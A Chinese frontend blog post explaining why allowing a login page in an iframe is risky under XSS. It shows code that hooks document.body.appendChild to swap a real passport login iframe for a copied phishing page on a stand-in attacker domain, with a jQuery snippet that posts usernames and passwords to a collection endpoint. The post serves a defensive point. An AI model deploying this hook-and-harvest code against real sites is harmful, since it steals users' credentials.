---
title: 「 安全 」从iframe说到万物皆可hook
date: 2019-02-15 17:06:31
tags: Security
---
#### 需求
今天遇到有业务要求我们的登录页允许被嵌在 iframe 中以满足导流需求，找安全的大佬们讨论了下，最后给出的结论是：

>如果业务方的代码写的挫了点，有 xss 漏洞的话，坏人完全可以把你本来的 iframe 隐藏掉，自己写个弹框出来，这样的话用户完全无感知地被篡改了，直接输入用户名和密码，信息就被上送到了坏人的服务器。

what？还能这样吗？ 那得写多少代码才能覆盖掉弹窗再伪造一个出来啊！

作为一个小白我算是长见识了。但是经过尝试，其实并不是那么回事。
<!-- more -->
#### 思考
但是作为一个与用户交互最紧密的前端，登录页总是302跳转到新的页面对于用户来说其实是非常不友好的，打断了用户操作，跳过去跳过来的都晕了，如果能够弹窗登录，那抢手机的路上将一气呵成，非常愉快呀！
弹窗登录一般都是 iframe 实现的，因为大家一般都是 sso 登录，也就是说要做出一个通用的框架，所以一般使用 iframe。

我弱弱的说了句，嗯，百度好像也是 iframe 呀，其他也有很多厂商是 iframe 的，这样的问题并不是很严重吧。
没想到大佬们立刻就开始研究百度的弹窗。结论是：
做的很巧妙啊！点击之后才出弹窗，xss 一般都是一开始就进行篡改，但是这种方式的话，坏人没办法获取用户点击【登录】的时机，这样应该没那么容易篡改。

#### 万物皆可hook
听得有点懵，后来才明白，他们就是想hook用户点击登录的click事件。

哈哈，术业有专攻。终于轮到我们前端大展身手的时候了，他们是不知道我们的【万物皆可hook】定理。

千千音乐盒为例：
![](/images/qian1.png)

点击登录之后，弹出了iframe，这时候一般都会有服务器交互，我们先看看chrome devtool的network，但是出现了好多条请求。这时候我们右键单击审查元素，看看iframe的src，其实凭经验来说，这种弹窗一般都是调用document.body.appendChild来添加在页面中，但是有更好的方法来佐证。

![](/images/qian3.png)
重要小tips：network中的Initiator会展示出发出请求的具体代码行数，点击一下就可以定位到具体是哪一行发出了这个请求。代码一般都压缩了的，点击下面的{}就可以格式化代码。果不其然，就是调用了appendChild，再看下html结构，显然是在append在body中的。

感兴趣的可以查看chrome devTool的使用（TODO）。

既然锁定了调用的是document.body.appendChild，那我们就可以放心的hook啦！
核心代码很简单，就是使用了js的call方法。
```js
let append = document.body.appendChild;
document.body.appendChild = function(el) {
  alert('hook success');
  append.call(document.body, el);
}
```
我们成功的hook了document.body.appendChild方法，在执行原来操作方式之前执行了我们的alert。

大佬要求我完整的实现隐藏原来的弹窗，弹出自己实现的弹窗。

那代码量应该不少吧。我们xss只能插入js，插入不了css，即使实现了也应该很丑吧。

no，no，no。

js啥都能插入!

html

```
const fakeIframe = document.createElement('div');
```

css

```
fakeIframe.style= 'border:1px solid #f8f8f8';
```
就是需要写好多dom操作的代码。

or 直接
```
fakeIframe.innerHTML='<iframe allowtransparency="true" style="border:0px none;position:absolute;top:0;left:0; width:100%;height:100%;"
src="//passport.taihe.com/v2/web/popLogin.html?target=pop&amp;u=https%3A%2F%2Fplay.taihe.com&amp;staticPage=https%3A%2F%2Fplay.taihe.com%2Fplayer%2Ftpassjump.html&amp;callback=tpass15504710495271&amp;tpl=baidu_music">
</iframe>';
```
本来打算自己写个iframe 登录页，转念一想，直接把他的页面copy出来算了，美观靠谱又省事儿。
打开//passport.taihe.com/v2/web/popLogin.html，chrome dev tool network，copy出popLogin.html的代码。
加上

```js
$('.tpass-button').on('click', function() {
  $.ajax({
    url: '/badEva/collect',
    type: 'POST',
    data: {
      username: $('.tpass-text-input-userName').val(),
      pwd: $('.tpass-text-input-password').val(),
    },
  })
});
```
部署在自己的server上，得到url如//passport.badeva.com/fakeLogin.html

```js
let append = document.body.appendChild;
document.body.appendChild = function(el) {
  let fakeIframe = document.createElement('div');
  fakeIframe.innerHTML = '<iframe allowtransparency="true" style="border:0px none;position:absolute;top:0;left:0; width:100%;height:100%;" src="//passport.badeva.com/fakeLogin.html" ></iframe>';
}
```
理论上四行代码就可以搞定了。

其实还有很多技术点可以细挖，先不展开说了。

#### 回溯
回想起来，这些思路还是来自于hook极验验证结果时得出来的。

引入了极验的sdk，但是用户每次滑动点选的结果对接入方来说是透明的，但是我们需要这些数据来进行分析，怎么才能得到用户每次验证的结果呢？

大家都说，页面都是你的页面，连个结果都获取不到？？？

计算每次的轨迹？

思考良久，脑子里突然闪过iOS里的method swizzling，具体是干啥的也不记得了，只记得method swizzling 黑魔法。

我的地盘我做主，怎么可能获取不到呢？

脑子里又闪过hook这个词。

对了，他们总是要给服务端结果的啊！hook他们的请求！

跨域只能jsonp，jsonp一般都是document.header.appendChild，轻轻松松得到结果，具体代码你可以自己试着写写。

但是随着时代的进步，极验也换用了CORS来进行跨域，hook Ajax就没有那么容易了。


#### 展望
大佬们很震惊，难道没有别的办法可以防止被hook吗？其实我们还是希望可以使用iframe来提升用户体验的。

但事实上js注入之后，可以做的事儿太多了。弹出iframe绕不过appendChild那些基础API，有xss漏洞就相当于敞开大门让坏人进来。

几乎是防不胜防。

所以更是提醒我们为了安全：

1.要尽量避免xss漏洞，请看这篇（TODO）

2.引入第三方js，一定要注意查看下network中是否有什么不清不楚的接口，偷偷的搜集了某些信息上送给别的服务端。

从这篇文章获取到的，你可以自己总结下。
顺便思考下hook Ajax的方法。

#### 彩蛋
虽然很绝望，但是首先，你需要一个xss漏洞。

大佬们微微一笑，xss漏洞远比你想象的多得多，即使简单的一个登录页就这段时间都检测出来了好多xss漏洞。

iframe白名单这个口子真的不能那么容易就打开呀，公司其实有很多赶工期的项目，开发周期短，代码写成啥样大家都懂，其实很容易出现xss漏洞。